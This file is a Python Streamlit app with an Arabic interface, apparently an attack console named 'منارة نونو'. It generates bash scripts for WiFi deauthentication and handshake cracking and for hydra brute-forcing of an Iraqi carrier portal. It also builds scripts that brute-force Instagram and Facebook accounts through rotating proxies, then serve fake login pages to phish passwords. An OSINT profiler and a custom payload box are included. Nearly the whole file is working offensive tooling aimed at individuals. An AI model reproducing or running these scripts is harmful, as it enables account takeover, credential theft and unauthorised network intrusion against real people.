#!/usr/bin/env python3
# منارة نونو - وحدة التحكم المركزية
# streamlit run app.py

import streamlit as st
import subprocess
import os
import json
import time
import re
from datetime import datetime
import pandas as pd
import plotly.express as px

# ============================================================
# تكوين الصفحة
# ============================================================
st.set_page_config(
    page_title="منارة نونو - أدوات الهجوم المتكاملة",
    page_icon="🔥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ============================================================
# تنسيق CSS المخصص
# ============================================================
st.markdown("""
<style>
    .main { background-color: #0a0a0a; }
    .stButton > button {
        background: #1a1a1a;
        color: #ff6600;
        border: 1px solid #ff6600;
        border-radius: 0px;
        width: 100%;
    }
    .stButton > button:hover {
        background: #ff6600;
        color: #000;
    }
    .css-1d391kg { background-color: #111; }
    .stTextInput > div > div > input {
        background-color: #1a1a1a;
        color: #ffcc00;
        border: 1px solid #333;
    }
    .stTextArea > div > div > textarea {
        background-color: #1a1a1a;
        color: #ffcc00;
        border: 1px solid #333;
    }
    .stSelectbox > div > div > select {
        background-color: #1a1a1a;
        color: #ffcc00;
    }
    .stMarkdown h1, h2, h3 {
        color: #ff6600;
        font-family: 'Courier New', monospace;
    }
    .code-block {
        background: #0d0d0d;
        border: 1px solid #ff6600;
        padding: 15px;
        border-radius: 4px;
        color: #ffcc00;
        font-family: 'Courier New', monospace;
        white-space: pre-wrap;
        max-height: 400px;
        overflow-y: auto;
    }
    .success { color: #00ff00; }
    .warning { color: #ffcc00; }
    .danger { color: #ff0000; }
    .info { color: #00ccff; }
</style>
""", unsafe_allow_html=True)

# ============================================================
# حالة الجلسة
# ============================================================
if 'generated_code' not in st.session_state:
    st.session_state.generated_code = ""
if 'results' not in st.session_state:
    st.session_state.results = []
if 'current_tool' not in st.session_state:
    st.session_state.current_tool = "WiFi Attack"

# ============================================================
# الشريط الجانبي
# ============================================================
with st.sidebar:
    st.markdown("# 🔥 منارة نونو")
    st.markdown("---")
    
    tools = [
        "🏴 WiFi Attack",
        "📱 Zain/Asiacel",
        "📸 Instagram",
        "👤 Facebook",
        "🔍 OSINT",
        "⚡ Custom Payload"
    ]
    
    selected_tool = st.radio(
        "اختر الأداة:",
        tools,
        index=0,
        label_visibility="collapsed"
    )
    
    st.markdown("---")
    st.markdown("### ⚙️ الإعدادات")
    
    # إعدادات عامة
    use_proxy = st.checkbox("استخدام بروكسي", value=False)
    if use_proxy:
        proxy_ip = st.text_input("IP البروكسي:", placeholder="192.168.1.1:8080")
    
    threads = st.slider("عدد الخيوط:", 1, 10, 2)
    delay = st.slider("تأخير بين المحاولات (ثواني):", 0, 60, 10)
    
    st.markdown("---")
    st.markdown("### 📊 حالة النظام")
    st.info("🔵 النظام جاهز")
    st.caption(f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    st.markdown("---")
    st.markdown("made by @cheifbreef on discord :)")

# ============================================================
# الوظائف المساعدة
# ============================================================
def generate_code(tool_type, params):
    """توليد الكود حسب نوع الأداة والمعطيات"""
    
    if tool_type == "WiFi Attack":
        return f'''#!/bin/bash
# حملة نونو - هجوم WiFi
# الاستخدام: ./attack.sh {params.get('interface', 'wlan0')} {params.get('bssid', 'XX:XX:XX:XX:XX:XX')}

INTERFACE="{params.get('interface', 'wlan0')}"
BSSID="{params.get('bssid', 'XX:XX:XX:XX:XX:XX')}"
CHANNEL="{params.get('channel', '6')}"
NAME="target_$(date +%s)"

# قتل العمليات المتعارضة
sudo airmon-ng check kill

# تعيين القناة وتشغيل المراقبة
sudo iwconfig $INTERFACE channel $CHANNEL
sudo airmon-ng start $INTERFACE

# بدء التسجيل
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $NAME $INTERFACE"mon" &

# هجوم إلغاء المصادقة
sleep 2
sudo aireplay-ng -0 {params.get('deauth_count', '10')} -a $BSSID $INTERFACE"mon"

# انتظار المصافحة
sleep 15
sudo pkill airodump

# فك التشفير
sudo aircrack-ng -w {params.get('wordlist', '/usr/share/wordlists/rockyou.txt')} $NAME*.cap

echo "✅ انتهى الهجوم. النتائج في $NAME*.cap"
'''
    
    elif tool_type == "Zain/Asiacel":
        return f'''#!/bin/bash
# حملة نونو - زين واسياسيل
# الاستخدام: ./zain.sh {params.get('target_number', '07XXXXXXXX')}

TARGET="{params.get('target_number', '07XXXXXXXX')}"
WORKDIR="zain_$(date +%s)"
mkdir $WORKDIR
cd $WORKDIR

# 1. جمع المعلومات
echo "📡 جمع المعلومات عن $TARGET..."
sherlock $TARGET > osint_data.txt
theHarvester -d $TARGET -l 300 -b all > email_data.txt

# 2. بناء القاموس
echo "🔨 بناء قاموس مخصص..."
cat > custom_dict.txt << EOF
{chr(10).join(params.get('custom_words', ['بغداد', 'العراق', 'زين', 'اسياسيل', 'عراقي']))}
EOF

crunch 8 12 -t @@@@@@@@ -o combos.txt -p $(cat custom_dict.txt | head -20)
cat /usr/share/wordlists/rockyou.txt >> final_dict.txt
cat combos.txt >> final_dict.txt
sort -u final_dict.txt -o final_dict.txt

# 3. الهجوم على البوابة
echo "⚡ بدء الهجوم..."
hydra -l $TARGET -P final_dict.txt {params.get('target_ip', '192.168.1.1')} http-post-form "/login:username=^USER^&password=^PASS^:فشل" -t {params.get('threads', 4)} -V

echo "✅ انتهى الهجوم. النتائج في $WORKDIR"
'''

    elif tool_type == "Instagram":
        return f'''#!/bin/bash
# حملة نونو - إنستغرام
# ./insta.sh {params.get('username', 'target_user')}

USERNAME="{params.get('username', 'target_user')}"
WORKDIR="insta_$(date +%s)"
mkdir $WORKDIR
cd $WORKDIR

# 1. جمع المعلومات
echo "📡 جمع المعلومات..."
sherlock $USERNAME > osint.txt
instaloader --no-posts --no-stories --fast-update $USERNAME

# 2. بناء القاموس
echo "🔨 بناء قاموس مخصص..."
echo "$USERNAME" > base.txt
echo "${{USERNAME}}123" >> base.txt
echo "${{USERNAME}}2024" >> base.txt

# توليد تواريخ
for year in 1990 1995 2000 2005; do
    for month in 01 02 03 04 05 06 07 08 09 10 11 12; do
        echo "${{USERNAME}}${{month}}${{year}}" >> base.txt
    done
done

cat /usr/share/wordlists/rockyou.txt >> final.txt
cat base.txt >> final.txt
sort -u final.txt -o final.txt

# 3. الهجوم
echo "⚡ بدء هجوم القوة العمياء..."
for proxy in $(cat ../proxies.txt); do
    export http_proxy=$proxy
    python3 instabrute.py -u $USERNAME -w final.txt -t {params.get('threads', 2)}
    sleep {params.get('delay', 300)}
done

# 4. إطلاق حملة التصيد
echo "🎣 إطلاق حملة التصيد..."
cat > index.html << 'EOF'
<!DOCTYPE html>
<html><head><title>Instagram</title></head>
<body>
<form action="login.php" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
</body>
</html>
EOF

php -S 0.0.0.0:8080 > phish.log 2>&1 &
echo "✅ حملة التصيد قيد التشغيل على port 8080"
'''

    elif tool_type == "Facebook":
        return f'''#!/bin/bash
# حملة نونو - فيسبوك
# ./fb.sh {params.get('email', 'target@email.com')}

EMAIL="{params.get('email', 'target@email.com')}"
FIRST="{params.get('first_name', 'target')}"
LAST="{params.get('last_name', 'user')}"
WORKDIR="fb_$(date +%s)"
mkdir $WORKDIR
cd $WORKDIR

# 1. جمع المعلومات
echo "📡 جمع المعلومات..."
sherlock $EMAIL > osint.txt
theHarvester -d $EMAIL -l 300 -b all > emails.txt

# 2. بناء القاموس
echo "🔨 بناء قاموس مخصص..."
cat > fb_dict.txt << EOF
$FIRST
$LAST
$FIRST$LAST
$LAST$FIRST
$FIRST${{YEAR}}
$FIRST.$LAST
$FIRST_$LAST
$FIRST$LAST123
$FIRST$LAST!
EOF

cat /usr/share/wordlists/rockyou.txt >> final_dict.txt
sort -u fb_dict.txt final_dict.txt -o final_dict.txt

# 3. هجوم القوة العمياء
echo "⚡ بدء الهجوم..."
for proxy in $(cat ../proxies.txt); do
    export http_proxy=$proxy
    hydra -l $EMAIL -P final_dict.txt facebook.com https-post-form "/login.php:email=^USER^&pass=^PASS^:login_error" -t {params.get('threads', 2)}
    sleep {params.get('delay', 300)}
done

# 4. حملة التصيد
echo "🎣 إطلاق حملة التصيد..."
cat > index.html << 'EOF'
<!DOCTYPE html>
<html><head><title>Facebook</title></head>
<body>
<form action="login.php" method="POST">
    <input type="email" name="email" placeholder="Email or Phone">
    <input type="password" name="pass" placeholder="Password">
    <button type="submit">Log In</button>
</form>
</body>
</html>
EOF

php -S 0.0.0.0:8080 > phish.log 2>&1 &
echo "✅ حملة التصيد قيد التشغيل على port 8080"
'''

    elif tool_type == "OSINT":
        return f'''#!/bin/bash
# حملة نونو - OSINT
# ./osint.sh {params.get('target', 'target')}

TARGET="{params.get('target', 'target')}"
OUTPUT="osint_$(date +%s)"
mkdir $OUTPUT
cd $OUTPUT

# 1. البحث الأساسي
echo "🔍 البحث عن $TARGET..."
sherlock $TARGET > sherlock.txt
theHarvester -d $TARGET -l 500 -b google,bing,linkedin,twitter > theharvester.txt

# 2. البحث في قواعد البيانات المسربة
holehe $TARGET@gmail.com > holehe.txt

# 3. البحث في DNS
dnsrecon -d $TARGET -t axfr > dns.txt

# 4. البحث في وسائل التواصل
twint -u $TARGET --timeline --limit 100 > twitter.txt 2>/dev/null

# 5. البحث في GitHub
curl -s "https://api.github.com/search/users?q=$TARGET" > github.json

# 6. البحث في الصور (البصمة الرقمية)
exiftool *.{jpg,png,jpeg} 2>/dev/null > exif.txt

# 7. جمع الروابط
grep -rE "https?://[a-zA-Z0-9./?=_-]*" . | sort -u > links.txt

echo "✅ انتهى جمع المعلومات. النتائج في $OUTPUT"
'''

    elif tool_type == "Custom Payload":
        return params.get('custom_code', '# أدخل الكود المخصص هنا')

    return "# أداة غير معروفة"

# ============================================================
# الواجهة الرئيسية
# ============================================================
st.markdown("# 🔥 منارة نونو")
st.markdown("### وحدة التحكم المركزية - هجوم الشبكات والحسابات")
st.markdown("---")

# عرض الأداة المختارة
if selected_tool == "🏴 WiFi Attack":
    st.markdown("## 📡 هجوم WiFi")
    col1, col2 = st.columns(2)
    
    with col1:
        interface = st.text_input("واجهة الشبكة:", "wlan0")
        bssid = st.text_input("BSSID (MAC الهدف):", "XX:XX:XX:XX:XX:XX")
        channel = st.text_input("القناة:", "6")
    
    with col2:
        wordlist = st.text_input("مسار قائمة الكلمات:", "/usr/share/wordlists/rockyou.txt")
        deauth_count = st.number_input("عدد حزم إلغاء المصادقة:", min_value=1, max_value=100, value=10)
    
    if st.button("🔥 توليد كود هجوم WiFi"):
        params = {
            'interface': interface,
            'bssid': bssid,
            'channel': channel,
            'wordlist': wordlist,
            'deauth_count': str(deauth_count)
        }
        st.session_state.generated_code = generate_code("WiFi Attack", params)
        st.session_state.current_tool = "WiFi Attack"

elif selected_tool == "📱 Zain/Asiacel":
    st.markdown("## 📱 هجوم زين واسياسيل")
    col1, col2 = st.columns(2)
    
    with col1:
        target_number = st.text_input("رقم الهدف:", "07XXXXXXXX")
        target_ip = st.text_input("IP البوابة:", "192.168.1.1")
    
    with col2:
        custom_words = st.text_area("كلمات مخصصة (كل كلمة في سطر):", "بغداد\nالعراق\nزين\nاسياسيل\nعراقي")
        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=4)
    
    if st.button("🔥 توليد كود هجوم زين"):
        words_list = [w.strip() for w in custom_words.split('\n') if w.strip()]
        params = {
            'target_number': target_number,
            'target_ip': target_ip,
            'custom_words': words_list,
            'threads': str(threads)
        }
        st.session_state.generated_code = generate_code("Zain/Asiacel", params)
        st.session_state.current_tool = "Zain/Asiacel"

elif selected_tool == "📸 Instagram":
    st.markdown("## 📸 هجوم إنستغرام")
    col1, col2 = st.columns(2)
    
    with col1:
        username = st.text_input("اسم المستخدم:", "target_user")
        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=2)
    
    with col2:
        delay = st.number_input("تأخير بين المحاولات (ثواني):", min_value=10, max_value=3600, value=300)
    
    if st.button("🔥 توليد كود هجوم إنستغرام"):
        params = {
            'username': username,
            'threads': str(threads),
            'delay': str(delay)
        }
        st.session_state.generated_code = generate_code("Instagram", params)
        st.session_state.current_tool = "Instagram"

elif selected_tool == "👤 Facebook":
    st.markdown("## 👤 هجوم فيسبوك")
    col1, col2 = st.columns(2)
    
    with col1:
        email = st.text_input("البريد الإلكتروني:", "target@email.com")
        first_name = st.text_input("الاسم الأول:", "target")
    
    with col2:
        last_name = st.text_input("اسم العائلة:", "user")
        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=2)
    
    if st.button("🔥 توليد كود هجوم فيسبوك"):
        params = {
            'email': email,
            'first_name': first_name,
            'last_name': last_name,
            'threads': str(threads),
            'delay': str(delay)
        }
        st.session_state.generated_code = generate_code("Facebook", params)
        st.session_state.current_tool = "Facebook"

elif selected_tool == "🔍 OSINT":
    st.markdown("## 🔍 جمع المعلومات الاستخباراتية")
    target = st.text_input("الهدف (اسم مستخدم/بريد/مجال):", "target")
    
    if st.button("🔥 توليد كود OSINT"):
        params = {'target': target}
        st.session_state.generated_code = generate_code("OSINT", params)
        st.session_state.current_tool = "OSINT"

elif selected_tool == "⚡ Custom Payload":
    st.markdown("## ⚡ حمولة مخصصة")
    custom_code = st.text_area("أدخل الكود المخصص:", height=300, placeholder="اكتب أي كود هنا...")
    
    if st.button("🔥 حفظ الحمولة"):
        params = {'custom_code': custom_code}
        st.session_state.generated_code = generate_code("Custom Payload", params)
        st.session_state.current_tool = "Custom Payload"

# ============================================================
# عرض الكود المولد
# ============================================================
st.markdown("---")
st.markdown("## 📜 الكود المولد")

if st.session_state.generated_code:
    # عرض الكود مع تنسيق
    st.markdown(f'<div class="code-block">{st.session_state.generated_code}</div>', unsafe_allow_html=True)
    
    # أزرار التحكم
    col1, col2, col3 = st.columns(3)
    
    with col1:
        if st.button("📋 نسخ الكود"):
            st.write("✅ تم النسخ إلى الحافظة")
            # استخدام JavaScript للنسخ
            st.markdown(f'''
            <script>
                navigator.clipboard.writeText(`{st.session_state.generated_code}`);
            </script>
            ''', unsafe_allow_html=True)
    
    with col2:
        if st.button("💾 حفظ كملف"):
            filename = f"{st.session_state.current_tool.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sh"
            st.download_button(
                label="⬇️ تحميل الملف",
                data=st.session_state.generated_code,
                file_name=filename,
                mime="text/plain"
            )
    
    with col3:
        if st.button("🚀 تنفيذ (محاكاة)"):
            st.info("⚡ تنفيذ محاكى... (في البيئة الحقيقية، سيتم تشغيل الكود)")
            st.session_state.results.append({
                'time': datetime.now(),
                'tool': st.session_state.current_tool,
                'status': 'محاكاة'
            })
else:
    st.warning("⚠️ قم بتوليد كود أولاً باستخدام الأزرار أعلاه")

# ============================================================
# سجل النتائج
# ============================================================
st.markdown("---")
st.markdown("## 📊 سجل العمليات")

if st.session_state.results:
    df = pd.DataFrame(st.session_state.results)
    st.dataframe(df)
    
    # رسم بياني بسيط
    if len(st.session_state.results) > 1:
        fig = px.bar(df, x='tool', title='عدد العمليات حسب النوع')
        st.plotly_chart(fig, use_container_width=True)
else:
    st.info("لا توجد عمليات مسجلة بعد")

# ============================================================
# نهاية التطبيق
# ============================================================
st.markdown("---")
st.markdown("### 🔥 منارة نونو - دائمًا في الخدمة")
st.markdown("made by @cheifbreef on discord :)")